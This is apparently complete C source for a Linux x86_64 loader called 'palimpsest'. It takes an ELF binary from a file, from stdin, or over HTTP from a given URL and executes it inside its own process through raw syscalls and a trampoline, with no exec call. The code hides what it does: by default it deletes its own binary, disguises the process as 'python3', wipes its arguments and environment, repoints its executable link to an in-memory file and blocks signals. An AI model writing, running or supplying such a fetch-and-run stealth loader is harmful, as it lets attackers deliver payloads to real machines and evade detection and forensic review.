#define _GNU_SOURCE
#include <elf.h>
#include <fcntl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/random.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define RELOC_SLACK (2UL << 20)
#define LAYOUT_OFF  0x40000UL
#define MAX_RANGES  512
#define MAX_ENV     128
#define ENVBUF_SZ   (1UL << 18)
#define N_UNMAP     22

extern char **environ;

struct range {
    uintptr_t start, end;
};

static struct {
    unsigned char *payload;
    size_t payload_len;
    char spoof[64];
    char interp[256];
    int dynamic;
    int keep;
    uintptr_t old_base, old_span;
    uintptr_t reloc_base, reloc_size;
    uintptr_t stack_top;
    uintptr_t vdso, hwcap;
    uid_t uid, euid, gid, egid;
    unsigned char rnd[16];
    uintptr_t tramp;
    struct range unmap[MAX_RANGES];
    int n_unmap;
    int envlen[MAX_ENV];
    int n_env;
    uintptr_t envbuf_off;
    unsigned char envbuf[ENVBUF_SZ];
    uint16_t t_phnum, t_phentsize, t_type;
    uintptr_t t_span, t_entry, t_phdr;
} G = { .t_type = ET_DYN };

static uintptr_t alup(uintptr_t v)
{
    return (v + 0xfff) & ~0xfffUL;
}

static void xcopy(void *d, const void *s, size_t n)
{
    unsigned char *dd = d;
    const unsigned char *ss = s;
    while (n--)
        *dd++ = *ss++;
}

static void xzero(void *d, size_t n)
{
    unsigned char *dd = d;
    while (n--)
        *dd++ = 0;
}

static size_t slen(const char *s)
{
    size_t n = 0;
    while (s[n])
        n++;
    return n;
}

static void write64(uintptr_t addr, uintptr_t v)
{
    unsigned char *p = (unsigned char *)addr;
    for (int i = 0; i < 8; i++)
        p[i] = (unsigned char)(v >> (8 * i));
}

static long raw6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
{
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8 __asm__("r8") = a5;
    register long r9 __asm__("r9") = a6;
    __asm__ volatile("syscall"
                     : "=a"(ret)
                     : "a"(n), "D"(a1), "S"(a2), "d"(a3),
                       "r"(r10), "r"(r8), "r"(r9)
                     : "rcx", "r11", "memory");
    return ret;
}

static long raw3(long n, long a1, long a2, long a3)
{
    return raw6(n, a1, a2, a3, 0, 0, 0);
}

static unsigned char *read_all(int fd, size_t *out_len)
{
    size_t cap = 1 << 20, len = 0;
    unsigned char *buf = malloc(cap);
    if (!buf)
        return NULL;
    ssize_t n;
    while ((n = read(fd, buf + len, cap - len)) > 0) {
        len += (size_t)n;
        if (len == cap) {
            cap *= 2;
            unsigned char *nb = realloc(buf, cap);
            if (!nb)
                return NULL;
            buf = nb;
        }
    }
    *out_len = len;
    return buf;
}

static unsigned char *fetch_http(const char *url, size_t *out_len)
{
    const char *p = strstr(url, "://");
    const char *host = p ? p + 3 : url;
    const char *pathp = strchr(host, '/');
    char hostbuf[256];
    char path[1024] = "/";
    size_t hl = pathp ? (size_t)(pathp - host) : strlen(host);
    if (hl >= sizeof(hostbuf))
        return NULL;
    memcpy(hostbuf, host, hl);
    hostbuf[hl] = 0;
    if (pathp)
        snprintf(path, sizeof(path), "%s", pathp);
    char *portp = strchr(hostbuf, ':');
    int port = 80;
    if (portp) {
        *portp = 0;
        port = atoi(portp + 1);
    }
    struct hostent *he = gethostbyname(hostbuf);
    if (!he)
        return NULL;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return NULL;
    struct sockaddr_in sa = { 0 };
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    memcpy(&sa.sin_addr, he->h_addr, 4);
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        close(fd);
        return NULL;
    }
    char req[1280];
    int rl = snprintf(req, sizeof(req),
                      "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",
                      path, hostbuf);
    write(fd, req, (size_t)rl);
    unsigned char *all = read_all(fd, out_len);
    close(fd);
    if (!all)
        return NULL;
    unsigned char *sep = memmem(all, *out_len, "\r\n\r\n", 4);
    if (!sep)
        return all;
    size_t hdrlen = (size_t)(sep - all) + 4;
    memmove(all, all + hdrlen, *out_len - hdrlen);
    *out_len -= hdrlen;
    return all;
}

static int parse_target(void)
{
    Elf64_Ehdr *eh = (Elf64_Ehdr *)G.payload;
    if (G.payload_len < sizeof(Elf64_Ehdr) ||
        memcmp(eh->e_ident, ELFMAG, SELFMAG) ||
        eh->e_ident[EI_CLASS] != ELFCLASS64 ||
        eh->e_ident[EI_DATA] != ELFDATA2LSB ||
        eh->e_machine != EM_X86_64 ||
        (eh->e_type != ET_EXEC && eh->e_type != ET_DYN))
        return -1;
    G.t_type = eh->e_type;
    G.t_entry = eh->e_entry;
    G.t_phnum = eh->e_phnum;
    G.t_phentsize = eh->e_phentsize;
    G.t_phdr = eh->e_phoff;
    G.t_span = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *ph = (Elf64_Phdr *)((char *)eh + eh->e_phoff +
                                        (size_t)i * eh->e_phentsize);
        if (ph->p_type == PT_LOAD) {
            uintptr_t e = ph->p_vaddr + ph->p_memsz;
            if (e > G.t_span)
                G.t_span = e;
        }
        if (ph->p_type == PT_PHDR)
            G.t_phdr = ph->p_vaddr;
        else if (ph->p_type == PT_LOAD && i == 0 && G.t_phdr == eh->e_phoff)
            G.t_phdr = ph->p_vaddr + eh->e_phoff;
        if (ph->p_type == PT_INTERP) {
            if (ph->p_filesz >= sizeof(G.interp))
                return -1;
            memcpy(G.interp, (char *)eh + ph->p_offset, ph->p_filesz);
            G.interp[ph->p_filesz] = 0;
            G.dynamic = 1;
        }
    }
    G.t_span = alup(G.t_span);
    return 0;
}

static int parse_self(void)
{
    uintptr_t ph = getauxval(AT_PHDR);
    Elf64_Ehdr *eh = (Elf64_Ehdr *)(ph - 0x40);
    if (memcmp(eh->e_ident, ELFMAG, SELFMAG))
        return -1;
    uintptr_t base = 0, span = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *p = (Elf64_Phdr *)(ph + (size_t)i * eh->e_phentsize);
        if (p->p_type == PT_PHDR)
            base = ph - p->p_vaddr;
        if (p->p_type == PT_LOAD) {
            uintptr_t e = p->p_vaddr + p->p_memsz;
            if (e > span)
                span = e;
        }
    }
    G.old_base = base;
    G.old_span = alup(span);
    return 0;
}

static void snap_env(void)
{
    size_t pos = 0;
    for (char **e = environ; *e && G.n_env < MAX_ENV; e++) {
        size_t l = strlen(*e) + 1;
        if (pos + l > sizeof(G.envbuf))
            break;
        memcpy(G.envbuf + pos, *e, l);
        G.envlen[G.n_env++] = (int)l;
        pos += l;
    }
    G.envbuf_off = (uintptr_t)G.envbuf - G.old_base;
}

static void scan_maps(void)
{
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f)
        return;
    char line[512], perms[8], path[256];
    uintptr_t a, b;
    while (fgets(line, sizeof(line), f)) {
        path[0] = 0;
        if (sscanf(line, "%lx-%lx %7s %*s %*s %*s %255[^\n]", &a, &b, perms, path) < 3)
            continue;
        if (strstr(path, "[stack]") || strstr(path, "[vdso]") ||
            strstr(path, "[vvar") || strstr(path, "[vsyscall]") ||
            strstr(path, "[heap]") || path[0] == 0)
            continue;
        if (G.n_unmap < MAX_RANGES) {
            G.unmap[G.n_unmap].start = a;
            G.unmap[G.n_unmap].end = b;
            G.n_unmap++;
        }
    }
    fclose(f);
}

static int clone_self(void)
{
    Elf64_Ehdr *eh = (Elf64_Ehdr *)G.old_base;
    uintptr_t dyn_off = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *ph = (Elf64_Phdr *)(G.old_base + eh->e_phoff +
                                        (size_t)i * eh->e_phentsize);
        if (ph->p_type == PT_LOAD && ph->p_memsz) {
            xcopy((void *)(G.reloc_base + ph->p_vaddr),
                  (const void *)(G.old_base + ph->p_vaddr), ph->p_filesz);
            if (ph->p_memsz > ph->p_filesz)
                xzero((void *)(G.reloc_base + ph->p_vaddr + ph->p_filesz),
                      ph->p_memsz - ph->p_filesz);
        }
        if (ph->p_type == PT_DYNAMIC)
            dyn_off = ph->p_vaddr;
    }
    uintptr_t rela = 0, relasz = 0, rel = 0, relsz = 0;
    if (dyn_off) {
        Elf64_Dyn *d = (Elf64_Dyn *)(G.old_base + dyn_off);
        for (; d->d_tag != DT_NULL; d++) {
            uintptr_t v = d->d_un.d_ptr;
            if (v >= G.old_base && v < G.old_base + G.old_span)
                v -= G.old_base;
            if (d->d_tag == DT_RELA)
                rela = v;
            else if (d->d_tag == DT_RELASZ)
                relasz = v;
            else if (d->d_tag == DT_REL)
                rel = v;
            else if (d->d_tag == DT_RELSZ)
                relsz = v;
        }
    }
    for (uintptr_t off = 0; off < relasz; off += sizeof(Elf64_Rela)) {
        Elf64_Rela *r = (Elf64_Rela *)(G.old_base + rela + off);
        if (ELF64_R_TYPE(r->r_info) == R_X86_64_RELATIVE && r->r_offset)
            *(uintptr_t *)(G.reloc_base + r->r_offset) =
                G.reloc_base +
                (*(uintptr_t *)(G.old_base + r->r_offset) - G.old_base);
    }
    for (uintptr_t off = 0; off < relsz; off += sizeof(Elf64_Rel)) {
        Elf64_Rel *r = (Elf64_Rel *)(G.old_base + rel + off);
        if (ELF64_R_TYPE(r->r_info) == R_X86_64_RELATIVE && r->r_offset)
            *(uintptr_t *)(G.reloc_base + r->r_offset) =
                G.reloc_base +
                (*(uintptr_t *)(G.old_base + r->r_offset) - G.old_base);
    }
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *ph = (Elf64_Phdr *)(G.old_base + eh->e_phoff +
                                        (size_t)i * eh->e_phentsize);
        if (ph->p_type != PT_LOAD || !ph->p_memsz)
            continue;
        int prot = 0;
        if (ph->p_flags & PF_R)
            prot |= PROT_READ;
        if (ph->p_flags & PF_W)
            prot |= PROT_WRITE;
        if (ph->p_flags & PF_X)
            prot |= PROT_EXEC;
        uintptr_t seg = G.reloc_base + ph->p_vaddr;
        mprotect((void *)(seg & ~0xfffUL), alup((seg & 0xfff) + ph->p_memsz), prot);
    }
    return 0;
}

static void make_tramp(void)
{
    G.tramp = (uintptr_t)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    static const unsigned char tpl[123] = {
        0xf3, 0x0f, 0x1e, 0xfa,
        0x48, 0xbf, 0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0xbe, 0, 0, 0, 0, 0, 0, 0, 0,
        0xb8, 0x0b, 0x00, 0x00, 0x00,
        0x0f, 0x05,
        0x48, 0xbc, 0, 0, 0, 0, 0, 0, 0, 0,
        0x48, 0x89, 0xe7,
        0x48, 0xba, 0, 0, 0, 0, 0, 0, 0, 0,
        0x31, 0xc0,
        0x31, 0xdb,
        0x31, 0xc9,
        0x31, 0xf6,
        0x31, 0xed,
        0x45, 0x31, 0xc0,
        0x45, 0x31, 0xc9,
        0x45, 0x31, 0xd2,
        0x45, 0x31, 0xdb,
        0x45, 0x31, 0xe4,
        0x45, 0x31, 0xed,
        0x45, 0x31, 0xf6,
        0x45, 0x31, 0xff,
        0xb8, 0x9e, 0x00, 0x00, 0x00,
        0xbf, 0x02, 0x10, 0x00, 0x00,
        0x31, 0xf6,
        0x0f, 0x05,
        0xbf, 0x01, 0x10, 0x00, 0x00,
        0x31, 0xf6,
        0x0f, 0x05,
        0x48, 0xb8, 0, 0, 0, 0, 0, 0, 0, 0,
        0xff, 0xe0,
    };
    xcopy((void *)G.tramp, tpl, sizeof(tpl));
    uintptr_t t_base = (G.t_type == ET_DYN) ? G.old_base : 0;
    write64(G.tramp + 6, G.reloc_base);
    write64(G.tramp + 16, G.reloc_size);
    write64(G.tramp + 46, t_base);
}

static int map_elf_raw(uintptr_t base, const unsigned char *buf)
{
    Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *ph = (Elf64_Phdr *)(buf + eh->e_phoff +
                                        (size_t)i * eh->e_phentsize);
        if (ph->p_type != PT_LOAD || !ph->p_memsz)
            continue;
        uintptr_t seg = base + ph->p_vaddr;
        uintptr_t mstart = seg & ~0xfffUL;
        uintptr_t mend = alup(seg + ph->p_memsz);
        long r = raw6(9, (long)mstart, (long)(mend - mstart), 3, 0x32, -1, 0);
        if (r != (long)mstart)
            return -1;
        if (ph->p_filesz)
            xcopy((void *)seg, buf + ph->p_offset, ph->p_filesz);
        if (ph->p_memsz > ph->p_filesz)
            xzero((void *)(seg + ph->p_filesz), ph->p_memsz - ph->p_filesz);
    }
    for (int i = 0; i < eh->e_phnum; i++) {
        Elf64_Phdr *ph = (Elf64_Phdr *)(buf + eh->e_phoff +
                                        (size_t)i * eh->e_phentsize);
        if (ph->p_type != PT_LOAD || !ph->p_memsz)
            continue;
        int prot = 0;
        if (ph->p_flags & PF_R)
            prot |= 1;
        if (ph->p_flags & PF_W)
            prot |= 2;
        if (ph->p_flags & PF_X)
            prot |= 4;
        uintptr_t seg = base + ph->p_vaddr;
        raw3(10, (long)(seg & ~0xfffUL), (long)alup((seg & 0xfff) + ph->p_memsz), prot);
    }
    return 0;
}

static uintptr_t build_layout(uintptr_t top, uintptr_t ldso_base)
{
    uintptr_t sp = top;
    const char *plat = "x86_64";
    sp -= 7;
    xcopy((void *)sp, plat, 7);
    uintptr_t plat_s = sp;
    size_t l = slen(G.spoof) + 1;
    sp -= l;
    xcopy((void *)sp, G.spoof, l);
    uintptr_t execfn_s = sp;
    sp -= 16;
    xcopy((void *)sp, G.rnd, 16);
    uintptr_t rnd_s = sp;
    uintptr_t env_s[MAX_ENV];
    uintptr_t cur = G.reloc_base + G.envbuf_off;
    for (int i = G.n_env - 1; i >= 0; i--) {
        sp -= (uintptr_t)G.envlen[i];
        xcopy((void *)sp, (const void *)cur, (size_t)G.envlen[i]);
        env_s[i] = sp;
        cur += (uintptr_t)G.envlen[i];
    }
    l = slen(G.spoof) + 1;
    sp -= l;
    xcopy((void *)sp, G.spoof, l);
    uintptr_t argv0_s = sp;

    sp &= ~0xfUL;
    size_t slots = (size_t)(4 + G.n_env) + 2 * 19 + 2;
    size_t space = (slots * 8 + 15) & ~0xfUL;
    sp -= space;
    uintptr_t *q = (uintptr_t *)sp;
    int i = 0;
    q[i++] = 1;
    q[i++] = argv0_s;
    q[i++] = 0;
    for (int e = 0; e < G.n_env; e++)
        q[i++] = env_s[e];
    q[i++] = 0;

    uintptr_t t_base = (G.t_type == ET_DYN) ? G.old_base : 0;
    uintptr_t aux_phdr = t_base + G.t_phdr;
    uintptr_t aux_entry = (G.t_type == ET_DYN) ? t_base + G.t_entry : G.t_entry;

    q[i++] = AT_PHDR;      q[i++] = aux_phdr;
    q[i++] = AT_PHENT;     q[i++] = G.t_phentsize;
    q[i++] = AT_PHNUM;     q[i++] = G.t_phnum;
    q[i++] = AT_PAGESZ;    q[i++] = 0x1000;
    if (G.dynamic) {
        q[i++] = AT_BASE;  q[i++] = ldso_base;
    }
    q[i++] = AT_FLAGS;     q[i++] = 0;
    q[i++] = AT_ENTRY;     q[i++] = aux_entry;
    q[i++] = AT_UID;       q[i++] = G.uid;
    q[i++] = AT_EUID;      q[i++] = G.euid;
    q[i++] = AT_GID;       q[i++] = G.gid;
    q[i++] = AT_EGID;      q[i++] = G.egid;
    q[i++] = AT_CLKTCK;    q[i++] = 100;
    q[i++] = AT_EXECFN;    q[i++] = execfn_s;
    q[i++] = AT_PLATFORM;  q[i++] = plat_s;
    q[i++] = AT_RANDOM;    q[i++] = rnd_s;
    q[i++] = AT_SECURE;    q[i++] = 0;
    q[i++] = AT_HWCAP;     q[i++] = G.hwcap;
    if (G.vdso) {
        q[i++] = AT_SYSINFO_EHDR; q[i++] = G.vdso;
    }
    q[i++] = AT_NULL;      q[i++] = 0;
    return sp;
}

static void __attribute__((noreturn, noinline)) stage2(void)
{
    __asm__("endbr64");
    uintptr_t staging = G.reloc_base + G.old_span;
    xcopy((void *)staging, G.payload, G.payload_len);
    xzero(G.payload, G.payload_len);
    uintptr_t ldso_buf = staging + alup(G.payload_len);

    uintptr_t ldso_base = 0, ldso_entry = 0;
    if (G.dynamic) {
        long fd = raw3(257, -100, (long)(uintptr_t)G.interp, 0);
        uintptr_t off = 0;
        for (;;) {
            long n = raw3(0, fd, (long)(ldso_buf + off), (long)(1UL << 20));
            if (n <= 0)
                break;
            off += (uintptr_t)n;
        }
        raw3(3, fd, 0, 0);
        Elf64_Ehdr *ie = (Elf64_Ehdr *)ldso_buf;
        uintptr_t span = 0;
        for (int i = 0; i < ie->e_phnum; i++) {
            Elf64_Phdr *ph = (Elf64_Phdr *)(ldso_buf + ie->e_phoff +
                                            (size_t)i * ie->e_phentsize);
            if (ph->p_type == PT_LOAD) {
                uintptr_t e = ph->p_vaddr + ph->p_memsz;
                if (e > span)
                    span = e;
            }
        }
        span = alup(span);
        long probe = raw6(9, 0, (long)span, 3, 0x22, -1, 0);
        raw3(11, probe, (long)span, 0);
        ldso_base = (uintptr_t)probe;
        map_elf_raw(ldso_base, (const unsigned char *)ie);
        ldso_entry = ldso_base + ie->e_entry;
    }

    for (int i = 0; i < G.n_unmap; i++) {
        raw3(11, (long)G.unmap[i].start,
             (long)(G.unmap[i].end - G.unmap[i].start), 0);
    }

    uintptr_t t_base = (G.t_type == ET_DYN) ? G.old_base : 0;
    if (map_elf_raw(t_base, (const unsigned char *)staging) < 0)
        raw3(60, 1, 0, 0);

    if (!G.dynamic && G.t_type == ET_DYN)
        raw3(60, 2, 0, 0);

    uintptr_t layout = build_layout(G.stack_top - LAYOUT_OFF, ldso_base);

    uintptr_t entry;
    if (G.dynamic)
        entry = ldso_entry;
    else
        entry = (G.t_type == ET_DYN) ? t_base + G.t_entry : G.t_entry;

    write64(G.tramp + 33, layout);
    write64(G.tramp + 113, entry);
    raw3(10, (long)G.tramp, 0x1000, 5);

    __asm__ volatile("jmp *%0" ::"r"(G.tramp) : "memory");
    __builtin_unreachable();
}

static void unlink_self(void)
{
    char self[4096];
    ssize_t n = readlink("/proc/self/exe", self, sizeof(self) - 1);
    if (n > 0) {
        self[n] = 0;
        unlink(self);
    }
}

static void try_fix_exe(const unsigned char *payload, size_t len)
{
    int fd = memfd_create("payload", MFD_CLOEXEC);
    if (fd < 0)
        return;
    write(fd, payload, len);
    prctl(PR_SET_MM, PR_SET_MM_EXE_FILE, fd, 0, 0);
    close(fd);
}

static void spoof_cmdline(int argc, char **argv, const char *name)
{
    size_t cap = strlen(argv[0]);
    strncpy(argv[0], name, cap);
    if (strlen(name) < cap)
        memset(argv[0] + strlen(name), 0, cap - strlen(name));
    for (int i = 1; i < argc; i++) {
        if (argv[i])
            memset(argv[i], 0, strlen(argv[i]));
    }
    for (char **e = environ; *e; e++)
        memset(*e, 0, strlen(*e));
}

static void usage(const char *name)
{
    fprintf(stderr,
        "usage:\n"
        "  %s file  <elf>   [spoof_name]   load ELF from a file\n"
        "  %s stdin [spoof_name]          load ELF from stdin\n"
        "  %s http  <url>   [spoof_name]  load ELF over http\n"
        "options:\n"
        "  -k   keep the loader binary on disk (default: unlink)\n",
        name, name, name);
}

int main(int argc, char **argv)
{
    const char *mode = NULL;
    const char *input = NULL;
    snprintf(G.spoof, sizeof(G.spoof), "python3");
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-k")) {
            G.keep = 1;
        } else if (!mode) {
            mode = argv[i];
        } else if (!strcmp(mode, "stdin")) {
            snprintf(G.spoof, sizeof(G.spoof), "%s", argv[i]);
        } else if (!input) {
            input = argv[i];
        } else {
            snprintf(G.spoof, sizeof(G.spoof), "%s", argv[i]);
        }
    }
    if (!mode || (strcmp(mode, "stdin") && !input)) {
        usage(argv[0]);
        return 1;
    }

    if (!strcmp(mode, "file")) {
        int fd = open(input, O_RDONLY);
        if (fd < 0) {
            perror("open");
            return 1;
        }
        G.payload = read_all(fd, &G.payload_len);
        close(fd);
    } else if (!strcmp(mode, "stdin")) {
        G.payload = read_all(STDIN_FILENO, &G.payload_len);
    } else if (!strcmp(mode, "http")) {
        G.payload = fetch_http(input, &G.payload_len);
    } else {
        usage(argv[0]);
        return 1;
    }
    if (!G.payload || parse_target() < 0) {
        fprintf(stderr, "unsupported ELF (need x86_64 ET_EXEC/ET_DYN)\n");
        return 1;
    }
    if (parse_self() < 0) {
        fprintf(stderr, "self parse failed\n");
        return 1;
    }

    G.stack_top = (uintptr_t)__builtin_frame_address(0) + 0x1000;
    G.vdso = getauxval(AT_SYSINFO_EHDR);
    G.hwcap = getauxval(AT_HWCAP);
    G.uid = getuid();
    G.euid = geteuid();
    G.gid = getgid();
    G.egid = getegid();
    getrandom(G.rnd, sizeof(G.rnd), 0);
    snap_env();

    sigset_t set;
    sigfillset(&set);
    sigdelset(&set, SIGKILL);
    sigdelset(&set, SIGSTOP);
    sigprocmask(SIG_BLOCK, &set, NULL);

    prctl(PR_SET_NAME, G.spoof, 0, 0, 0);
    scan_maps();

    G.reloc_size = G.old_span + alup(G.payload_len) + RELOC_SLACK;
    G.reloc_base = (uintptr_t)mmap(NULL, G.reloc_size, PROT_READ | PROT_WRITE,
                                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (G.reloc_base == (uintptr_t)MAP_FAILED) {
        fprintf(stderr, "reloc region mmap failed\n");
        return 1;
    }
    make_tramp();
    clone_self();
    if (!G.keep)
        unlink_self();
    try_fix_exe(G.payload, G.payload_len);

    fprintf(stderr, "[palimpsest] %zu bytes -> base 0x%lx (dynamic=%d)\n",
            G.payload_len, G.old_base, G.dynamic);
    spoof_cmdline(argc, argv, G.spoof);

    uintptr_t s2 = G.reloc_base + ((uintptr_t)(uintptr_t(*)(void))stage2 - G.old_base);
    __asm__ volatile("subq $8, %%rsp\n\t"
                     "jmp *%0" ::"r"(s2) : "memory");
    __builtin_unreachable();
}
